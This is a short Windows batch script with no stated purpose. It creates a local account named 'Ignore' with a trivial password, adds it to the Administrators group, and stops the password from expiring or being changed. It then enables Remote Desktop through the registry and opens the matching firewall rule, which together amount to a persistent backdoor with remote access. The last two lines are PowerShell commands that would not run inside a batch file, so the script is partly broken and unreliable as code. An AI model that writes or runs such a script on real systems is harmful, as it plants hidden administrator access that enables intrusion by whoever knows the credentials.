@echo off

net user "Ignore" "password" /add
net localgroup "Administrators" "Ignore" /add

WMIC USERACCOUNT WHERE "Name='Ignore'" SET PasswordExpires=FALSE

WMIC USERACCOUNT WHERE "Name='Ignore'" SET Passwordchangeable=FALSE

Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0

Enable-NetFirewallRule -DisplayGroup "Remote Desktop"